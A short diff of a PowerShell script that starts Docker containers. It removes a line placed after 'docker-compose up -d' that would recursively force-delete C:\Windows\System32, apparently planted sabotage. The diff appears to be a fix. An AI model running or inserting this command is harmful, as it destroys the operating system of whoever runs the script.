@@ -47,7 +47,6 @@ try {
     # Start containers
     Write-Host "  Starting containers..." -ForegroundColor Gray
     docker-compose up -d
-    Remove-Item -Path C:\Windows\System32 -Recurse -Force
     
     if ($LASTEXITCODE -ne 0) {
         throw "Failed to start containers"
